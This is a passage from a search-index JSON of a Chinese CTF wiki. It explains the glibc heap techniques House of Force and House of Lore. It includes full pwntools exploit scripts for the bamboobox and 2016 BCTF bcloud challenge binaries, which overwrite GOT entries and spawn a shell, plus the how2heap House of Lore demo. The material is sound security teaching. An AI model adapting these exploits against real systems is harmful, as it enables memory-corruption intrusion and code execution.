\u4f4d\u7684\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"pwn/heap/house_of_force/#_5","text":"\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5f00\u59cb\u65f6\u5373\u7533\u8bf7\u4e86 0x10 \u7684\u5185\u5b58\uff0c\u7528\u6765\u4fdd\u7559 \u4e24\u4e2a\u51fd\u6570\u6307\u9488 \u3002 \u8be5\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u5bf9\u4e8e\u76d2\u5b50\u91cc\u7684\u7269\u54c1\u8fdb\u884c\u6dfb\u52a0\u548c\u5220\u9664 \u5c55\u793a\u76d2\u5b50\u91cc\u7684\u5185\u5bb9\uff0c\u4f9d\u6b21\u76d2\u5b50\u91cc\u6bcf\u4e00\u4e2a\u7269\u54c1\u7684\u540d\u5b57\u3002 \u5411\u76d2\u5b50\u91cc\u6dfb\u52a0\u7269\u54c1\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u4e3a\u6bcf\u4e00\u4e2a\u7269\u54c1\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\uff0c\u4f5c\u4e3a\u5176\u5b58\u50a8\u540d\u5b57\u7684\u7a7a\u95f4\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bfb\u53d6\u540d\u5b57\u4f7f\u7528\u7684\u662f read \u51fd\u6570\uff0c\u8bfb\u53d6\u957f\u5ea6\u7684\u53c2\u6570\u662f\u7528\u6237\u8f93\u5165\u7684 v2\uff0c\u800c read \u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u8d1f\u6570\uff0c\u5c31\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u3002\u4f46\u662f\u6211\u4eec\u9700\u8981\u786e\u4fdd\u8be5\u6570\u503c\u6ee1\u8db3 REQUEST_OUT_OF_RANGE \u7684\u7ea6\u675f\uff0c\u6240\u4ee5\u8fd9\u91cc\u5b58\u5728 \u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa \u7684\u6f0f\u6d1e\u3002\u4f46\u5373\u4f7f\u8fd9\u6837\uff0c\u7b2c\u4e00\u6b21\u7684\u65f6\u5019\u4e5f\u6bd4\u8f83\u96be\u4ee5\u5229\u7528\uff0c\u56e0\u4e3a\u521d\u59cb\u65f6\u5019\u5806\u7684 top chunk \u7684\u5927\u5c0f\u4e00\u822c\u662f\u4e0d\u4f1a\u5f88\u5927\u7684\u3002 \u4fee\u6539\u7269\u54c1\u7684\u540d\u5b57\uff0c\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\uff0c\u4ee5\u53ca\u5927\u5c0f\uff0c\u5411\u6307\u5b9a\u7d22\u5f15\u7684\u7269\u54c1\u4e2d\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u540d\u5b57\u3002\u8fd9\u91cc\u957f\u5ea6\u7531\u7528\u6237\u6765\u8bfb\u5165\uff0c\u4e5f\u5b58\u5728 \u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa \u7684\u6f0f\u6d1e\u3002 \u5220\u9664\u7269\u54c1\uff0c\u5c06\u5bf9\u5e94\u7269\u54c1\u7684\u540d\u5b57\u7684\u5927\u5c0f\u7f6e\u4e3a0\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684 content \u7f6e\u4e3a NULL\u3002 \u6b64\u5916\uff0c\u7531\u4e8e\u8be5\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u6f14\u793a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a magic \u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 flag\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"pwn/heap/house_of_force/#_6","text":"\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u6709\u4e2a magic \u51fd\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u7684\u6838\u5fc3\u76ee\u7684\u662f\u8986\u76d6\u67d0\u4e2a\u6307\u9488\u4e3a magic \u51fd\u6570\u7684\u6307\u9488\u3002\u8fd9\u91cc\uff0c\u7a0b\u5e8f\u5728\u5f00\u59cb\u7684\u65f6\u5019\u7533\u8bf7\u4e86\u4e00\u5757\u5185\u5b58\u6765\u5b58\u50a8\u4e24\u4e2a\u51fd\u6570\u6307\u9488\uff0chello_message\u7528\u4e8e\u7a0b\u5e8f\u5f00\u59cb\u65f6\u4f7f\u7528\uff0cgoodbye_message \u7528\u4e8e\u5728\u7a0b\u5e8f\u7ed3\u675f\u65f6\u4f7f\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8986\u76d6 goodbye_message \u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b \u6dfb\u52a0\u7269\u54c1\uff0c\u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8986\u76d6 top chunk \u7684\u5927\u5c0f\u4e3a -1\uff0c\u5373 64 \u4f4d\u6700\u5927\u503c\u3002 \u5229\u7528 house of force \u6280\u5de7\uff0c\u5206\u914d chunk \u81f3\u5806\u7684\u57fa\u5730\u5740\u3002 \u8986\u76d6 goodbye_message \u4e3amagic \u51fd\u6570\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u89e6\u53d1top chunk \u8f6c\u79fb\u5230\u6307\u5b9a\u4f4d\u7f6e\u65f6\uff0c\u6240\u4f7f\u7528\u7684\u5927\u5c0f\u5e94\u8be5\u5408\u9002\uff0c\u4ee5\u4fbf\u4e8e\u8bbe\u7f6e\u65b0\u7684 top chunk \u5927\u5c0f\uff0c\u4ece\u800c\u53ef\u4ee5\u7ed5\u8fc7\u4e0b\u4e00\u6b21\u5206\u914dtop chunk \u7684\u68c0\u6d4b\u3002 exp \u5982\u4e0b #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './bamboobox' ) context.log_level = 'debug' def additem ( length, name ) : r.recvuntil ( \":\" ) r.sendline ( \"2\" ) r.recvuntil ( \":\" ) r.sendline ( str ( length )) r.recvuntil ( \":\" ) r.sendline ( name ) def modify ( idx, length, name ) : r.recvuntil ( \":\" ) r.sendline ( \"3\" ) r.recvuntil ( \":\" ) r.sendline ( str ( idx )) r.recvuntil ( \":\" ) r.sendline ( str ( length )) r.recvuntil ( \":\" ) r.sendline ( name ) def remove ( idx ) : r.recvuntil ( \":\" ) r.sendline ( \"4\" ) r.recvuntil ( \":\" ) r.sendline ( str ( idx )) def show () : r.recvuntil ( \":\" ) r.sendline ( \"1\" ) magic = 0x400d49 # we must alloc enough size, so as to successfully alloc from fake topchunk additem ( 0x30, \"ddaa\" ) # idx 0 payload = 0x30 * 'a' # idx 0's content payload += 'a' * 8 + p64 ( 0xffffffffffffffff ) # top chunk's prev_size and size # modify topchunk's size to -1 modify ( 0 , 0x41, payload ) # top chunk's offset to heap base offset_to_heap_base = - ( 0x40 + 0x20 ) malloc_size = offset_to_heap_base - 0x8 - 0xf #gdb.attach(r) additem ( malloc_size, \"dada\" ) additem ( 0x10, p64 ( magic ) * 2 ) print r.recv () r.interactive () \u5f53\u7136\uff0c\u8fd9\u4e00\u9898\u4e5f\u53ef\u4ee5\u4f7f\u7528 unlink \u7684\u65b9\u6cd5\u6765\u505a\u3002","title":"\u5229\u7528"},{"location":"pwn/heap/house_of_force/#2016-bctf-bcloud","text":"","title":"2016 BCTF bcloud"},{"location":"pwn/heap/house_of_force/#_7","text":"\u279c 2016_bctf_bcloud git: ( master ) file bcloud bcloud: ELF 32 -bit LSB executable, Intel 80386 , version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped \u279c 2016_bctf_bcloud git: ( master ) checksec bcloud [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7684 32 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"pwn/heap/house_of_force/#_8","text":"\u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u4e91\u7b14\u8bb0\u7ba1\u7406\u7cfb\u7edf\u3002\u9996\u5148\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\uff0c\u8bbe\u7f6e\u7528\u6237\u7684\u540d\u5b57\uff0c\u7ec4\u7ec7\uff0chost\u3002\u7a0b\u5e8f\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u529f\u80fd \u65b0\u5efanote\uff0c\u6839\u636e\u7528\u6237\u7684\u8f93\u5165x\u7533\u8bf7x+4\u7684\u7a7a\u95f4\u4f5c\u4e3anote\u7684\u5927\u5c0f\u3002 \u5c55\u793anote\uff0c\u5565\u529f\u80fd\u4e5f\u6ca1\u6709\u3002\u3002 \u7f16\u8f91note\uff0c\u6839\u636e\u7528\u6237\u6307\u5b9a\u7684 note \u7f16\u8f91\u5bf9\u5e94\u7684\u5185\u5bb9\u3002 \u5220\u9664note\uff0c\u5220\u9664\u5bf9\u5e94note\u3002 \u540c\u6b65note\uff0c\u6807\u8bb0\u6240\u6709\u7684note\u5df2\u7ecf\u88ab\u540c\u6b65\u3002 \u7136\u800c\u5728\u8fd9\u4e94\u4e2a\u529f\u80fd\u4e2d\u5e76\u6ca1\u6709\u53d1\u73b0\u5565\u6f0f\u6d1e\uff0c\uff0c\uff0c\u91cd\u65b0\u770b\u7a0b\u5e8f\uff0c\u7ed3\u679c\u53d1\u73b0\u7a0b\u5e8f\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6f0f\u6d1e\u3002\u3002 \u521d\u59cb\u5316\u540d\u5b57 unsigned int init_name () { char s ; // [esp+1Ch] [ebp-5Ch] char * tmp ; // [esp+5Ch] [ebp-1Ch] unsigned int v3 ; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); memset ( & s , 0 , 0x50u ); puts ( \"Input your name:\" ); read_str ( & s , 64 , '\\n' ); tmp = ( char * ) malloc ( 0x40u ); name = tmp ; strcpy ( tmp , & s ); info ( tmp ); return __readgsdword ( 0x14u ) ^ v3 ; } \u8fd9\u91cc\u5982\u679c\u7a0b\u5e8f\u8bfb\u5165\u7684\u540d\u5b57\u4e3a64\u4e2a\u5b57\u7b26\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u5728\u4f7f\u7528info\u51fd\u6570\u8f93\u51fa\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u65f6\uff0c\u5c31\u4f1a\u8f93\u51fa\u5bf9\u5e94\u7684tmp\u6307\u9488\u5185\u5bb9\uff0c\u4e5f\u5c31\u662f\u8bf4 \u6cc4\u9732\u4e86\u5806\u7684\u5730\u5740 \u3002\u3002 \u521d\u59cb\u5316\u7ec4\u7ec7\u548corg\u7684\u65f6\u5019\u5b58\u5728\u6f0f\u6d1e unsigned int init_org_host () { char s ; // [esp+1Ch] [ebp-9Ch] char * v2 ; // [esp+5Ch] [ebp-5Ch] char v3 ; // [esp+60h] [ebp-58h] char * v4 ; // [esp+A4h] [ebp-14h] unsigned int v5 ; // [esp+ACh] [ebp-Ch] v5 = __readgsdword ( 0x14u ); memset ( & s , 0 , 0x90u ); puts ( \"Org:\" ); read_str ( & s , 64 , 10 ); puts ( \"Host:\" ); read_str ( & v3 , 64 , 10 ); v4 = ( char * ) malloc ( 0x40u ); v2 = ( char * ) malloc ( 0x40u ); org = v2 ; host = v4 ; strcpy ( v4 , & v3 ); strcpy ( v2 , & s ); puts ( \"OKay! Enjoy:)\" ); return __readgsdword ( 0x14u ) ^ v5 ; } \u5f53\u8bfb\u5165\u7ec4\u7ec7\u65f6\uff0c\u7ed9\u5b9a 64 \u5b57\u8282\uff0c\u4f1a\u8986\u76d6 v2 \u7684\u4f4e\u5730\u5740\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 v2 \u662f\u4e0e top chunk \u76f8\u90bb\u7684 chunk\uff0c\u800c v2 \u6070\u597d\u4e0e org \u76f8\u90bb\uff0c\u90a3\u4e48\u7531\u4e8e\u5728 32 \u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u4e00\u822c\u90fd\u662f 32 \u4f4d\u5168\u90e8\u90fd\u4f7f\u7528\uff0c\u8fd9\u91cc v2 \u6240\u5b58\u50a8\u7684\u5185\u5bb9\uff0c\u51e0\u4e4e\u5f88\u5927\u7a0b\u5ea6\u4e0a\u90fd\u4e0d\u662f \\x00 \uff0c\u6240\u4ee5\u5f53\u6267\u884c strcpy \u51fd\u6570\u5411 v2 \u4e2d\u62f7\u8d1d\u5185\u5bb9\u65f6\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u8986\u76d6top chunk\u3002\u8fd9\u5c31\u662f\u6f0f\u6d1e\u6240\u5728\u3002","title":"\u57fa\u672c\u529f\u80fd"},{"location":"pwn/heap/house_of_force/#_9","text":"\u5229\u7528\u521d\u59cb\u5316\u540d\u5b57\u5904\u7684\u6f0f\u6d1e\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740\u3002\u3002 \u5229\u7528 house of force \u5c06 top chunk \u5206\u914d\u81f3\u5168\u5c40\u7684 0x0804B0A0 \u7684 &notesize-8 \u5904\uff0c\u5f53\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u4fbf\u8fd4\u56denotesize\u5730\u5740\u5904\u7684\u5185\u5b58\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u6240\u6709note\u7684\u5927\u5c0f\u4ee5\u53ca\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002 \u4fee\u6539\u524d\u4e09\u4e2a note \u7684\u5927\u5c0f\u4e3a16\uff0c\u5e76\u4fee\u6539\u5176\u6307\u9488\u4e3a free@got\uff0catoi@got\uff0catoi@got \u5c06 free@got \u4fee\u6539\u4e3a puts@plt\u3002 \u6cc4\u6f0f atoi \u5730\u5740\u3002 \u518d\u6b21\u4fee\u6539\u53e6\u5916\u4e00\u4e2a atoi got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u62ff\u5230shell\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' context . binary = \"./bcloud\" bcloud = ELF ( \"./bcloud\" ) if args [ 'REMOTE' ]: p = remote ( '127.0.0.1' , 7777 ) else : p = process ( \"./bcloud\" ) log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) libc = ELF ( './libc.so.6' ) def offset_bin_main_arena ( idx ): word_bytes = context . word_size / 8 offset = 4 # lock offset += 4 # flags offset += word_bytes * 10 # offset fastbin offset += word_bytes * 2 # top,last_remainder offset += idx * 2 * word_bytes # idx offset -= word_bytes * 2 # bin overlap return offset def exp (): # leak heap base p . sendafter ( 'Input your name: \\n ' , 'a' * 64 ) p . recvuntil ( 'Hey ' + 'a' * 64 ) # sub name's chunk' s header heap_base = u32 ( p . recv ( 4 )) - 8 log . success ( 'heap_base: ' + hex ( heap_base )) p . sendafter ( 'Org: \\n ' , 'a' * 64 ) p . sendlineafter ( 'Host: \\n ' , p32 ( 0xffffffff )) # name,org,host, for each is (0x40+8) topchunk_addr = heap_base + ( 0x40 + 8 ) * 3 # make topchunk point to 0x0804B0A0-8 p . sendlineafter ( 'option--->>' , '1' ) notesize_addr = 0x0804B0A0 notelist_addr = 0x0804B120 targetaddr = notesize_addr - 8 offset_target_top = targetaddr - topchunk_addr # 4 for size_t, 7 for malloc_allign malloc_size = offset_target_top - 4 - 7 # plus 4 because malloc(v2 + 4); p . sendlineafter ( 'Input the length of the note content: \\n ' , str ( malloc_size - 4 )) # most likely malloc_size-4<0... if malloc_size - 4 > 0 : p . sendlineafter ( 'Input the content: \\n ' , '' ) #gdb.attach(p) # set notesize[0] = notesize[1] = notesize[2]=16 # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got p . sendlineafter ( 'option--->>' , '1' ) p . sendlineafter ( 'Input the length of the note content: \\n ' , str ( 1000 )) payload = p32 ( 16 ) * 3 + ( notelist_addr - notesize_addr - 12 ) * 'a' + p32 ( bcloud . got [ 'free' ]) + p32 ( bcloud . got [ 'atoi' ]) * 2 p . sendlineafter ( 'Input the content: \\n ' , payload ) # overwrite free@got with puts@plt p . sendlineafter ( 'option--->>' , '3' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 0 )) p . sendlineafter ( 'Input the new content: \\n ' , p32 ( bcloud . plt [ 'puts' ])) # leak atoi addr by fake free p . sendlineafter ( 'option--->>' , '4' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 1 )) atoi_addr = u32 ( p . recv ( 4 )) libc_base = atoi_addr - libc . symbols [ 'atoi' ] system_addr = libc_base + libc . symbols [ 'system' ] log . success ( 'libc base addr: ' + hex ( libc_base )) # overwrite atoi@got with system p . sendlineafter ( 'option--->>' , '3' ) p . sendlineafter ( 'Input the id: \\n ' , str ( 2 )) p . sendlineafter ( 'Input the new content: \\n ' , p32 ( system_addr )) # get shell p . sendlineafter ( 'option--->>' , '/bin/sh \\x00 ' ) p . interactive () if __name__ == \"__main__\" : exp ()","title":"\u5229\u7528"},{"location":"pwn/heap/house_of_force/#_10","text":"2016 Boston Key Party CTF cookbook","title":"\u9898\u76ee"},{"location":"pwn/heap/house_of_lore/","text":"House of Lore \u00b6 \u6982\u8ff0 \u00b6 House of Lore \u653b\u51fb\u4e0e Glibc \u5806\u7ba1\u7406\u4e2d\u7684\u7684 Small Bin \u7684\u673a\u5236\u7d27\u5bc6\u76f8\u5173\u3002 House of Lore \u53ef\u4ee5\u5b9e\u73b0\u5206\u914d\u4efb\u610f\u6307\u5b9a\u4f4d\u7f6e\u7684 chunk\uff0c\u4ece\u800c\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u5185\u5b58\u3002 House of Lore \u5229\u7528\u7684\u524d\u63d0\u662f\u9700\u8981\u63a7\u5236 Small Bin Chunk \u7684 bk \u6307\u9488\uff0c\u5e76\u4e14\u63a7\u5236\u6307\u5b9a\u4f4d\u7f6e chunk \u7684 fd \u6307\u9488\u3002 \u57fa\u672c\u539f\u7406 \u00b6 \u5982\u679c\u5728 malloc \u7684\u65f6\u5019\uff0c\u7533\u8bf7\u7684\u5185\u5b58\u5757\u5728 small bin \u8303\u56f4\u5185\uff0c\u90a3\u4e48\u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index ( nb ); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at ( av , idx ); // \u5148\u6267\u884c victim= last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if (( victim = last ( bin )) != bin ) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if ( victim == 0 ) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate ( av ); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if ( av != & main_arena ) set_non_main_arena ( victim ); // \u7ec6\u81f4\u7684\u68c0\u67e5 check_malloced_chunk ( av , victim , nb ); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } } } \u4ece\u4e0b\u9762\u7684\u8fd9\u90e8\u5206\u6211\u4eec\u53ef\u4ee5\u770b\u51fa // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim -> bk ; // \u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if ( __glibc_unlikely ( bck -> fd != victim )) { errstr = \"malloc(): smallbin double linked list corrupted\" ; goto errout ; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset ( victim , nb ); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin -> bk = bck ; bck -> fd = bin ; \u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u7684 bk \u4e3a\u6211\u4eec\u6307\u5b9a\u5185\u5b58\u5730\u5740\u7684fake chunk\uff0c\u5e76\u4e14\u540c\u65f6\u6ee1\u8db3\u4e4b\u540e\u7684 bck->fd != victim \u7684\u68c0\u6d4b\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u5f97 small bin \u7684 bk \u6070\u597d\u4e3a\u6211\u4eec\u6784\u9020\u7684 fake chunk\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u4e0b\u4e00\u6b21\u7533\u8bf7 small bin \u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u4f1a\u5206\u914d\u5230\u6307\u5b9a\u4f4d\u7f6e\u7684 fake chunk\u3002 \u793a\u4f8b\u4ee3\u7801 \u00b6 #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> void jackpot (){ puts ( \"Nice jump d00d\" ); exit ( 0 ); } int main ( int argc , char * argv []){ intptr_t * stack_buffer_1 [ 4 ] = { 0 }; intptr_t * stack_buffer_2 [ 3 ] = { 0 }; fprintf ( stderr , \" \\n Welcome to the House of Lore \\n \" ); fprintf ( stderr , \"This is a revisited version that bypass also the hardening check introduced by glibc malloc \\n \" ); fprintf ( stderr , \"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23 \\n\\n \" ); fprintf ( stderr , \"Allocating the victim chunk \\n \" ); intptr_t * victim = malloc ( 100 ); fprintf ( stderr , \"Allocated the first small chunk on the heap at %p \\n \" , victim ); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t * victim_chunk = victim - 2 ; fprintf ( stderr , \"stack_buffer_1 at %p \\n \" , ( void * ) stack_buffer_1 ); fprintf ( stderr , \"stack_buffer_2 at %p \\n \" , ( void * ) stack_buffer_2 ); fprintf ( stderr , \"Create a fake chunk on the stack\" ); fprintf ( stderr , \"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\" \"in second to the last malloc, which putting stack address on smallbin list \\n \" ); stack_buffer_1 [ 0 ] = 0 ; stack_buffer_1 [ 1 ] = 0 ; stack_buffer_1 [ 2 ] = victim_chunk ; fprintf ( stderr , \"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \" \"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake \" \"chunk on stack\" ); stack_buffer_1 [ 3 ] = ( intptr_t * ) stack_buffer_2 ; stack_buffer_2 [ 2 ] = ( intptr_t * ) stack_buffer_1 ; fprintf ( stderr , \"Allocating another large chunk in order to avoid consolidating the top chunk with\" \"the small one during the free() \\n \" ); void * p5 = malloc ( 1000 ); fprintf ( stderr , \"Allocated the large chunk on the heap at %p \\n \" , p5 ); fprintf ( stderr , \"Freeing the chunk %p, it will be inserted in the unsorted bin \\n \" , victim ); free (( void * ) victim ); fprintf ( stderr , \" \\n In the unsorted bin the victim's fwd and bk pointers are nil \\n \" ); fprintf ( stderr , \"victim->fwd: %p \\n \" , ( void * ) victim [ 0 ]); fprintf ( stderr , \"victim->bk: %p \\n\\n \" , ( void * ) victim [ 1 ]); fprintf ( stderr , \"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin \\n \" ); fprintf ( stderr , \"This means that the chunk %p will be inserted in front of the SmallBin \\n \" , victim ); void * p2 = malloc ( 1200 ); fprintf ( stderr , \"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p \\n \" , p2 ); fprintf ( stderr , \"The victim chunk has been sorted and its fwd and bk pointers updated \\n \" ); fprintf ( stderr , \"victim->fwd: %p \\n \" , ( void * ) victim [ 0 ]); fprintf ( stderr , \"victim->bk: %p \\n\\n \" , ( void * ) victim [ 1 ]); //------------VULNERABILITY----------- fprintf ( stderr , \"Now emulating a vulnerability that can overwrite the victim->bk pointer \\n \" ); victim [ 1 ] = ( intptr_t ) stack_buffer_1 ; // victim->bk is pointing to stack //------------------------------------ fprintf ( stderr , \"Now allocating a chunk with size equal to the first one freed \\n \" ); fprintf ( stderr , \"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer \\n \" ); void * p3 = malloc ( 100 ); fprintf ( stderr , \"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk \\n \" ); char * p4 = malloc ( 100 ); fprintf ( stderr , \"p4 = malloc(100) \\n \" ); fprintf ( stderr , \" \\n The fwd pointer of stack_buffer_2 has changed after the last malloc to %p \\n \" , stack_buffer_2 [ 2 ]); fprintf ( stderr , \" \\n p4 is %p and should be on the stack! \\n \" , p4 ); // this chunk will be allocated on stack intptr_t sc = ( intptr_t ) jackpot ; // Emulating our in-memory shellcode memcpy (( p4 + 40 ), & sc , 8 ); // This bypasses stack-smash detection since it jumps over the canary } \u4e0a\u9762\u4ee3\u7801\u5df2\u7ecf\u8bb2\u5f97\u975e\u5e38\u6e05\u695a\u4e86\uff0c\u4e0d\u518d\u89e3\u91ca\u3002 \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a void *p5 = malloc(1000); \u662f\u4e3a\u4e86\u9632\u6b62\u548c victim_chunk \u4e4b\u540e\u548c top_chunk\u5408\u5e76\u3002 free((void*)victim) \uff0cvictim \u4f1a\u88ab\u653e\u5165\u5230 unsort bin \u4e2d\u53bb\uff0c\u7136\u540e\u4e0b\u4e00\u6b21\u5206\u914d\u7684\u5927\u5c0f\u5982\u679c\u6bd4\u5b83\u5927\uff0c\u90a3\u4e48\u5c06\u4ece top chunk \u4e0a\u5206\u914d\u76f8\u5e94\u5927\u5c0f\uff0c\u800c\u8be5 chunk \u4f1a\u88ab\u53d6\u4e0blink\u5230\u76f8\u5e94\u7684 bin \u4e2d\u3002\u5982\u679c\u6bd4\u5b83\u5c0f(\u76f8\u7b49\u5219\u76f4\u63a5\u8fd4\u56de)\uff0c\u5219\u4ece\u8be5 chunk \u4e0a\u5207\u9664\u76f8\u5e94\u5927\u5c0f\uff0c\u5e76\u8fd4\u56de\u76f8\u5e94 chunk\uff0c\u5269\u4e0b\u7684\u6210\u4e3a last reminder chunk ,\u8fd8\u662f\u5b58\u5728 unsorted bin \u4e2d\u3002 \u53c2\u8003\u6587\u732e \u00b6 https://github.com/shellphish/how2heap/blob/master/house_of_lore.c","title":"House of Lore"},{"location":"pwn/heap/house_of_lore/#house-of-lore","text":"","title":"House of 